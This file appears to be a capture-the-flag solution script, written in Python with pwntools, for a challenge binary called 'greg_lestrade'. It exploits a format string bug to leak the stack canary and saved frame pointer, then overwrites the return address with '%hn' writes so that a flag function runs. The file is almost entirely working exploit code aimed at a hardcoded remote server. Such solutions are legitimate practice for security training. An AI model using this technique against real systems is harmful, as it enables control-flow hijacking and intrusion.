#!/bin/env python
# -*- coding: utf-8 -*-

# MIT License
#
# Copyright (c) 2017 Pietro Ferretti
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

'''Format string vulnerability'''

# TODO use fmtstr from pwnlib, much easier

import re
from pwn import *
context.binary = './greg_lestrade'

HOST = '146.185.132.36'
PORT = 12431

FLAG_FUNC = 0x40087A

with remote(HOST, PORT) as conn:
# with process('./greg_lestrade') as conn:
    conn.recvuntil('Credential : ')
    conn.sendline('7h15_15_v3ry_53cr37_1_7h1nk')

    # read stack
    # for i in range(500):
    #     conn.recvuntil('action\n')
    #     conn.sendline('1')
    #     conn.recvuntil('command : ')
    #     payload = ''
    #     payload += 'a' * 300
    #     payload += '%{}$llx\n'.format(i)
    #     conn.send(payload)
    #     result = conn.recvuntil('0) exit').strip('0) exit')
    #     print i, '->', result[300:],

    # read canary
    conn.recvuntil('action\n')
    conn.sendline('1')
    conn.recvuntil('command : ')
    payload = ''
    payload += 'a' * 300
    payload += '%137$llx\n'
    conn.send(payload)
    leak = conn.recvuntil('0) exit')[300:-8]
    print "Canary:", leak
    canary = u64(('0'*(16-len(leak))+leak).decode('hex')[::-1])

    # read saved ebp
    conn.recvuntil('action\n')
    conn.sendline('1')
    conn.recvuntil('command : ')
    payload = ''
    payload += 'a' * 300
    payload += '%138$llx\n'
    conn.send(payload)
    leak = conn.recvuntil('0) exit')[300:-8]
    print "Saved EBP:", leak
    leak = '0' * (16 - len(leak)) + leak
    eip_addr = u64(leak.decode('hex')[::-1]) - 104
    print "Address to saved EIP:", p64(eip_addr)[::-1].encode('hex')

    # write over eip
    conn.recvuntil('action\n')
    conn.sendline('1')
    conn.recvuntil('command : ')

    small = (FLAG_FUNC >> 16) & 0xffff  # 64
    big = FLAG_FUNC & 0xffff            # 2170

    payload = ''
    payload += 'a' * 304
    payload += "%{}c".format((small - 304) % 2**16)
    payload += "%50$hn"           # write to first address
    payload += "%{}c".format((big - small) % 2**16)
    payload += "%51$hn"           # write to second address
    payload += 'x' * int(8 - ((len(payload)/8.0 - len(payload)/8) * 8))    # padding
    payload += p64(eip_addr + 2)  # where (small)
    payload += p64(eip_addr)      # where (big)

    conn.send(payload)

    print conn.recvall()
